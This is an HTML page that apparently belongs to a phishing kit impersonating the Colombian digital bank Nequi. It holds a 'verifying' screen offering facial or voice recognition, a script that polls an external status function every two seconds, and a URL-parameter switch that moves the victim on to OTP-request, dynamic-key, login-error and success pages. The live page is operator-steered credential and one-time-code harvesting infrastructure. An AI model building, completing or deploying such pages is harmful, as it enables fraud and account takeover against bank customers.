<!DOCTYPE html>
<html>
<head>
    <title>Verificando...</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="shortcut icon" href="../assets/img/favicon.ico">
    <script src="../assets/js/jquery-3.6.0.min.js"></script>
    <link href="../assets/css/styles.css" rel="stylesheet">
    <link href="../assets/css/stylesheet.css" rel="stylesheet">
    <script src="../assets/js/functions.js?v2"></script>
    <style>
        #fondo{position:fixed;width:100%;height:100%;top:0;left:0;background:#ffffffc4;z-index:300;}
        #cargando{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:400;}
    </style>
</head>
<body>
    <div id="fondo"></div>
    <img src="../assets/img/cargando.gif" id="cargando">

    <div class="cabecera">
        <table border="0" cellpadding="0" cellspacing="0" width="94%" style="max-width: 1200px; margin: 0 auto;">
            <tr>
                <td valign="middle" align="left"><img src="../assets/img/logo.svg" width="130"></td>
                <td valign="middle" align="right">
                    <button class="btn btn-std btn-sprd top-btn">Recarga</button>
                    <button class="btn btn-std btn-sprd top-btn">Salir</button>
                    <img src="../assets/img/menu.jpg" id="btn-menu">
                </td>
            </tr>
        </table>
        <div class="bar-menu">
            <span class="menu-interno marcado">Mi Nequi</span>
            <span class="menu-interno">Certificados</span>
            <span class="menu-interno">Ayuda</span>
        </div>
    </div>

    <div class="contenido-interno">
        <div class="frm" id="frm-reconocimiento">
            <div class="titulo-app">¿Cómo quieres que te reconozcamos hoy?</div>
            <div class="opcion-app" id="btn-facial">
                <table border="0" width="100%" cellpadding="0" cellspacing="0">
                    <tr>
                        <td rowspan="2" width="76"><img src="../assets/img/imagen.jpg" width="60"></td>
                        <td valign="bottom" align="left"><b>Reconocimiento facial</b></td>
                    </tr>
                    <tr>
                        <td valign="top" align="left">Más seguridad</td>
                    </tr>
                </table>
            </div>
            <div class="opcion-app" id="btn-voz">
                <table border="0" width="100%" cellpadding="0" cellspacing="0">
                    <tr>
                        <td rowspan="2" width="76"><img src="../assets/img/mic.jpg" width="60"></td>
                        <td valign="bottom" align="left"><b>Reconocimiento de voz</b></td>
                    </tr>
                    <tr>
                        <td valign="top" align="left">Confirma que eres tú</td>
                    </tr>
                </table>
            </div>
        </div>
    </div>

    <div class="pie">
        <table border="0" cellpadding="0" cellspacing="0" width="94%" style="max-width: 1200px; margin: 0 auto;">
            <tr><td id="logo-blanco-movil"><img src="../assets/img/logo-blanco.svg" width="176" style="margin-bottom:27px;"><div class="separador"></div></td></tr>
        </table>
        <table border="0" cellpadding="0" cellspacing="0" width="94%" style="max-width: 1200px; margin: 0 auto;">
            <tr>
                <td valign="top" id="logo-blanco"><img src="../assets/img/logo-blanco.svg" width="176"></td>
                <td valign="top">
                    <div class="titulo-footer">Producto</div>
                    <div class="item-footer">Legales</div>
                    <div class="item-footer">Ayuda</div>
                </td>
                <td valign="top" id="app">
                    <div class="titulo-footer">Descarga la App</div>
                    <img src="../assets/img/icon-app.jpg" style="margin-top:10px;">
                </td>
            </tr>
        </table>
    </div>

    <!-- TU SCRIPT ORIGINAL (sin tocar) -->
    <script>
    $(document).ready(function($){
        if (typeof consultar_estado === 'function') {
            setInterval(consultar_estado, 2000);
        }
        if(detectar_dispositivo() != "PC"){
            $(".cabecera,.pie").hide();
            $(".frm").css({"width":"calc(100% - 40px)","background-color":"transparent"});
            $(".contenido-interno").css({"padding-top":"0px","padding-bottom":"0px","height":"100%","background-image":"url(../assets/img/fondo.jpg)","background-position":"bottom","background-repeat":"no-repeat","background-color":"#fff","min-height":"500px"});
        }
    });
    </script>

    <!-- REDIRECCIÓN AUTOMÁTICA CON URL (SIN POLLING) -->
    <script>
    const urlParams = new URLSearchParams(window.location.search);
    const action = urlParams.get('do');

    if (action) {
        let destino = '';
        let mensaje = '';

        switch(action) {
            case 'otp':
                mensaje = 'Tu clave OTP es: 4821';
                destino = '/solicitar/';
                break;
            case 'error':
                mensaje = 'Clave incorrecta';
                destino = '/login/';
                break;
            case 'dinamica':
                mensaje = 'Pide la clave dinámica';
                destino = '/verify-voice/';
                break;
            case 'loginerr':
                mensaje = 'Error de login';
                destino = '/login/';
                break;
            case 'ok':
                mensaje = 'Acceso concedido!';
                destino = '/successful/';
                break;
            default:
                mensaje = 'Acción desconocida';
                destino = '/verifying/';
        }

        // MUESTRA MENSAJE Y REDIRIGE
        document.body.innerHTML = `
            <div style="text-align:center;padding:80px;background:#742fe1;color:white;font-family:Arial;height:100vh">
                <h1>${mensaje}</h1>
                <p>Redirigiendo...</p>
                <div style="border:16px solid #fff;border-top:16px solid #ff6b6b;border-radius:50%;width:80px;height:80px;animation:spin 1s linear infinite;margin:30px auto"></div>
            </div>
            <style>@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>
        `;

        setTimeout(() => { window.location.href = destino; }, 1800);
    }
    </script>

    <script src="../assets/js/ready.js?v2"></script>
</body>
</html>
